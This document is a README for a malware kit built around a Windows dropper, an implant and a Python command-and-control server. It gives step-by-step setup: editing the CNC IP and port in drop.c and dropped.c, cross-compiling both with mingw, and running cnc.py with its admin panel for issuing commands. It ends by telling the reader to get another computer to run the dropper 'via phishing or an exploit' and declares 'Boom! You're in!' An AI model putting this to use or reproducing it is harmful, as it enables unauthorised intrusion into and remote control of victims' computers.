Cool little implant.


Setup:


Open drop.c and find:


    wcscat(l, L"\\dropped.exe");

    if (!f(L"192.168.1.230", 5706, L"dropped.exe", l)) return 1;

replace dropped.exe with the name of the payload you're gonna compile in a second (optional if not changing name)
replace 192.168.1.230 with your CNC's IP address
replace 5706 with the port your CNC is using, make sure it's accessable (optional)

Open dropped.c and find:

#define A L"192.168.1.230"
#define B 5706

replace 192.168.1.230 with your CNC's IP address
replace 5706 with the port your CNC is using


Build:


x86_64-w64-mingw32-gcc -O2 -mwindows drop.c -o bingledrop.exe -lwininet
x86_64-w64-mingw32-gcc -O2 -mwindows dropped.c -o dropped.exe -lwininet

place dropped.exe in the payloads folder



Use:

python cnc.py 5706 (replace 5706 with another port if you like, but make sure you configured it in your binaries)

open a web browser and visit http://127.0.0.1:<CNC port>/admin
or if accessing the CNC remotely (like SSH) visit http://<CNC IP>:<CNC port>/admin


Follow the examples to build a command, and click Deploy Command

Get another computer to run your dropper (bingledrop.exe by default) via phishing or an exploit

Boom! You're in!
